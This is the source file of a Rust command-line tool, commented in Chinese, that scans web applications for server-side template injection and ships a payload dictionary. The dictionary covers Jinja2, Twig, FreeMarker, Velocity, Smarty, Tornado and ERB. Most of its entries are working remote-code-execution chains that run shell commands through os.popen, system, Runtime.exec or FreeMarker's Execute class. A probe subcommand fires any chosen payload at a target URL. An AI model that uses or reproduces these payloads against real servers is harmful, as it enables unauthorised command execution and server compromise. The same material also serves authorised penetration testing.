//! ssti - 服务端模板注入(SSTI)检测与 payload 字典

use clap::{Args as ClapArgs, Parser, Subcommand};
use common::http::{HttpClient, HttpOpts};
use common::{exit, finish, Mode, Out};
use percent_encoding::{utf8_percent_encode, AsciiSet, NON_ALPHANUMERIC};
use serde::Serialize;
use std::process::ExitCode;

const MARKER: &str = "{INJ}";

const QUOTE_SET: &AsciiSet = &NON_ALPHANUMERIC
    .remove(b'_')
    .remove(b'.')
    .remove(b'-')
    .remove(b'~');

const DETECT_PROBES: [&str; 9] = [
    "{{7*7}}",
    "${7*7}",
    "{7*7}",
    "<%= 7*7 %>",
    r#"{{7*"7"}}"#,
    "${7*7}",
    "#{7*7}",
    "*{7*7}",
    "{{config}}",
];

struct Engine {
    name: &'static str,
    lines: &'static [&'static str],
}

const ENGINES: [Engine; 7] = [
    Engine {
        name: "jinja2",
        lines: &[
            "",
            "# Jinja2 (Flask) -- 探测 {{7*7}} 得 49",
            "{{7*7}}",
            "{{config}}",
            r#"{{self.__init__.__globals__["__builtins__"].__import__("os").popen("id").read()}}"#,
            r#"{{"".__class__.__mro__[1].__subclasses__()}}"#,
            r#"{{cycler.__init__.__globals__.os.popen("id").read()}}"#,
            r#"{{lipsum.__globals__["os"].popen("id").read()}}"#,
            r#"{{range.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__["__builtins__"]["__import__"]("os").popen("id").read()}}"#,
        ],
    },
    Engine {
        name: "twig",
        lines: &[
            "",
            "# Twig (PHP Symfony) -- 探测 {{7*7}} 得 49",
            "{{7*7}}",
            r#"{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}"#,
            r#"{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}"#,
            r#"{{app.request.server.all|join(",")}}"#,
        ],
    },
    Engine {
        name: "freemarker",
        lines: &[
            "",
            "# FreeMarker (Java) -- 探测 ${7*7} 得 49",
            "${7*7}",
            r#"${"freemarker.template.utility.Execute"?new()("id")}"#,
            r#"<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}"#,
        ],
    },
    Engine {
        name: "velocity",
        lines: &[
            "",
            "# Velocity (Java) -- 探测 #set($x=7*7)$x 得 49",
            "#set($x=7*7)$x",
            r#"#set($e="");$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")"#,
        ],
    },
    Engine {
        name: "smarty",
        lines: &[
            "",
            "# Smarty (PHP) -- 探测 {7*7} 得 49",
            "{7*7}",
            "{php}echo `id`;{/php}",
            r#"{system("id")}"#,
        ],
    },
    Engine {
        name: "tornado",
        lines: &[
            "",
            "# Tornado (Python) -- 探测 {{7*7}} 得 49",
            "{{7*7}}",
            r#"{% import os %}{{os.popen("id").read()}}"#,
            r#"{{__import__("os").popen("id").read()}}"#,
        ],
    },
    Engine {
        name: "erb",
        lines: &[
            "",
            "# ERB (Ruby) -- 探测 <%= 7*7 %> 得 49",
            "<%= 7*7 %>",
            r#"<%= system("id") %>"#,
        ],
    },
];

#[derive(Parser, Debug)]
#[command(
    name = "ssti",
    version,
    about = "SSTI 模板注入检测 + payload 字典",
    long_about = "ssti -- 模板注入检测 + payload 字典\n\n用法:\n  ssti detect <URL> [--data \"a={INJ}\"] [--cookie c] [--true-word w]\n        检测: 注入 {{7*7}} 等探测串, 响应出现 49 即命中\n  ssti payloads [jinja2|twig|freemarker|velocity|smarty|tornado|erb|全部]\n        列出 payload 字典\n  ssti probe <URL> \"<payload>\" [--data ...] [--cookie ...]\n        发送单条 payload 看响应\n\n例子:\n  ssti detect \"http://x/?name={INJ}\"\n  ssti detect \"http://x/\" --data \"username={INJ}\" --true-word admin\n  ssti payloads jinja2",
    after_help = "退出码: 0=命中 1=无结果 2=用法错误 3=运行错误"
)]
struct Args {
    #[command(subcommand)]
    cmd: Cmd,

    /// JSON 输出
    #[arg(long, global = true)]
    json: bool,
}

#[derive(Subcommand, Debug)]
enum Cmd {
    /// 检测: 注入 {{7*7}} 等探测串, 响应出现 49 即命中
    Detect(DetectArgs),
    /// 列出 payload 字典
    Payloads(PayloadsArgs),
    /// 发送单条 payload 看响应
    Probe(ProbeArgs),
}

#[derive(ClapArgs, Debug)]
struct HttpArgs {
    /// HTTP 超时(秒)
    #[arg(long, default_value_t = 8, value_name = "SECS")]
    timeout: u64,

    /// HTTP 代理
    #[arg(long, value_name = "URL")]
    proxy: Option<String>,

    /// 跳过 TLS 证书校验
    #[arg(long)]
    insecure: bool,

    /// 自定义 User-Agent
    #[arg(long, value_name = "UA")]
    ua: Option<String>,

    /// Cookie
    #[arg(long, value_name = "COOKIE")]
    cookie: Option<String>,
}

#[derive(ClapArgs, Debug)]
struct DetectArgs {
    /// 目标 URL, 注入点用 {INJ} 标记
    #[arg(value_name = "URL")]
    url: String,

    /// POST 数据, 注入点用 {INJ} 标记
    #[arg(long, value_name = "DATA")]
    data: Option<String>,

    /// 命中关键字
    #[arg(long, value_name = "WORD")]
    true_word: Option<String>,

    #[command(flatten)]
    http: HttpArgs,
}

#[derive(ClapArgs, Debug)]
struct PayloadsArgs {
    /// 引擎名(jinja2|twig|freemarker|velocity|smarty|tornado|erb|全部)
    #[arg(value_name = "ENGINE", default_value = "全部")]
    engine: String,
}

#[derive(ClapArgs, Debug)]
struct ProbeArgs {
    /// 目标 URL, 注入点用 {INJ} 标记
    #[arg(value_name = "URL")]
    url: String,

    /// 要发送的 payload
    #[arg(value_name = "PAYLOAD")]
    payload: String,

    /// POST 数据, 注入点用 {INJ} 标记
    #[arg(long, value_name = "DATA")]
    data: Option<String>,

    #[command(flatten)]
    http: HttpArgs,
}

#[derive(Serialize)]
struct DetectEntry {
    probe: String,
    status: u16,
    hit: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    reason: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
}

#[derive(Serialize)]
struct DetectReport {
    url: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    data: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    true_word: Option<String>,
    hit: bool,
    results: Vec<DetectEntry>,
}

#[derive(Serialize)]
struct SingleReport {
    url: String,
    payload: String,
    status: u16,
    body: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
}

#[derive(Serialize)]
struct EngineInfo {
    name: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    comment: Option<String>,
    payloads: Vec<String>,
}

#[derive(Serialize)]
struct PayloadsReport {
    engine: String,
    engines: Vec<EngineInfo>,
}

fn quote(s: &str) -> String {
    utf8_percent_encode(s, QUOTE_SET).to_string()
}

fn make_client(h: &HttpArgs) -> Result<HttpClient, String> {
    let opts = HttpOpts {
        timeout: h.timeout,
        proxy: h.proxy.clone(),
        insecure: h.insecure,
        user_agent: h.ua.clone().unwrap_or_else(|| HttpOpts::default().user_agent),
        cookie: h.cookie.clone(),
        ..HttpOpts::default()
    };
    HttpClient::new(&opts)
}

fn send(
    client: &HttpClient,
    url: &str,
    data: &Option<String>,
    payload: &str,
) -> (u16, String, Option<String>) {
    let enc = quote(payload);
    let headers = [("Connection".to_string(), "close".to_string())];
    match data {
        Some(d) => {
            let body = d.replace(MARKER, &enc);
            match client.request(
                "POST",
                url,
                &headers,
                Some((body.as_bytes(), "application/x-www-form-urlencoded")),
            ) {
                Ok(r) => (r.status, r.text(), None),
                Err(e) => (0, String::new(), Some(e)),
            }
        }
        None => {
            let u = url.replace(MARKER, &enc);
            match client.request("GET", &u, &headers, None) {
                Ok(r) => (r.status, r.text(), None),
                Err(e) => (0, String::new(), Some(e)),
            }
        }
    }
}

fn detect(out: &Out, a: &DetectArgs) -> u8 {
    out.info(&format!("[*] SSTI 检测: {}", a.url));
    let client = match make_client(&a.http) {
        Ok(c) => c,
        Err(e) => {
            out.error(&format!("HTTP 初始化失败: {e}"));
            return exit::ERROR;
        }
    };
    let mut results = Vec::new();
    let mut hit = false;
    for p in DETECT_PROBES {
        let (status, body, error) = send(&client, &a.url, &a.data, p);
        let mut reason = None;
        if p.contains("7*7") && body.contains("49") {
            reason = Some("响应含 49".to_string());
        }
        if p.contains("config") && (body.contains("__") || body.contains("secret")) {
            reason = Some("config 泄露".to_string());
        }
        if let Some(w) = &a.true_word {
            if !w.is_empty() && body.contains(w.as_str()) {
                reason = Some(format!("命中关键字 {w}"));
            }
        }
        let matched = reason.is_some();
        if matched {
            hit = true;
            if !out.json() {
                println!("[+] HIT: {p} -> 响应含 49");
            }
        } else if !out.json() {
            println!("[-] {p}");
        }
        results.push(DetectEntry {
            probe: p.to_string(),
            status,
            hit: matched,
            reason,
            error,
        });
        if matched {
            break;
        }
    }
    let report = DetectReport {
        url: a.url.clone(),
        data: a.data.clone(),
        true_word: a.true_word.clone(),
        hit,
        results,
    };
    out.emit(
        || {
            if hit {
                println!("[*] 疑似模板:");
                println!("  {{{{7*7}}}} 命中 -> Jinja2/Twig/Tornado");
                println!("  ${{7*7}} 命中 -> FreeMarker/EL");
                println!("  {{7*7}}  命中 -> Smarty");
                println!("  <%= %> 命中 -> ERB/ASP");
                println!("  用 'ssti payloads <引擎>' 拿利用链");
            }
        },
        &report,
    );
    if hit {
        exit::OK
    } else {
        exit::NO_RESULT
    }
}

fn probe(out: &Out, a: &ProbeArgs) -> u8 {
    let client = match make_client(&a.http) {
        Ok(c) => c,
        Err(e) => {
            out.error(&format!("HTTP 初始化失败: {e}"));
            return exit::ERROR;
        }
    };
    let (status, body, error) = send(&client, &a.url, &a.data, &a.payload);
    let report = SingleReport {
        url: a.url.clone(),
        payload: a.payload.clone(),
        status,
        body: body.clone(),
        error,
    };
    out.emit(|| println!("{body}"), &report);
    exit::OK
}

fn engine_info(e: &Engine) -> EngineInfo {
    let mut comment = None;
    let mut payloads = Vec::new();
    for line in e.lines {
        if line.is_empty() {
            continue;
        }
        if let Some(c) = line.strip_prefix('#') {
            comment = Some(c.trim_start().to_string());
        } else {
            payloads.push(line.to_string());
        }
    }
    EngineInfo {
        name: e.name.to_string(),
        comment,
        payloads,
    }
}

fn print_block(lines: &[&str]) {
    for line in lines {
        println!("{line}");
    }
}

fn payloads(out: &Out, a: &PayloadsArgs) -> u8 {
    if a.engine == "全部" {
        let report = PayloadsReport {
            engine: "全部".to_string(),
            engines: ENGINES.iter().map(engine_info).collect(),
        };
        out.emit(
            || {
                for e in ENGINES.iter() {
                    println!("==== {} ====", e.name);
                    print_block(e.lines);
                }
            },
            &report,
        );
    } else {
        let Some(e) = ENGINES.iter().find(|e| e.name == a.engine) else {
            out.error(&format!("未知引擎: {}", a.engine));
            return exit::USAGE;
        };
        let report = PayloadsReport {
            engine: a.engine.clone(),
            engines: vec![engine_info(e)],
        };
        out.emit(|| print_block(e.lines), &report);
    }
    exit::OK
}

fn main() -> ExitCode {
    let args = Args::parse();
    let out = Out::new(Mode::from_flag(args.json));
    let code = match &args.cmd {
        Cmd::Detect(a) => detect(&out, a),
        Cmd::Payloads(a) => payloads(&out, a),
        Cmd::Probe(a) => probe(&out, a),
    };
    finish(code)
}
